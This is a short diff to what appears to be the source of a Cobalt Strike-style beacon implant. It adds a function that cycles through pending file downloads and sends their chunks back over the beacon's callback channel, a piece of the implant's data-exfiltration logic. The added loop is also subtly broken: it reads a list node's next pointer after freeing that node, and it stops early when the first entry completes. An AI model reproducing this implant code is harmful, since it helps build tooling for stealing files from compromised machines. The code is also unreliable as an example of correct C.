@@ -176,3 +176,27 @@ void DownloadFileChunk(DOWNLOAD_ENTRY* download, int chunkMaxSize)
 	BeaconOutput(CALLBACK_FILE_WRITE, (char*)&gDownloadChunk, totalRead + sizeof(int));
 	DownloadCloseSafely(download);
 }
+
+void DownloadHandleAll(int chunkMaxSize)
+{
+	DOWNLOAD_ENTRY* prev = NULL;
+	for (DOWNLOAD_ENTRY* download = gDownloads; download; download = download->next)
+	{
+		if (download->remainingData == 0)
+		{
+			if (prev == NULL)
+			{
+				gDownloads = download->next;
+				free(download);
+				return;
+			}
+			prev->next = download->next;
+			free(download);
+		}
+		else
+		{
+			DownloadFileChunk(download, chunkMaxSize);
+			prev = download;
+		}
+	}
+}
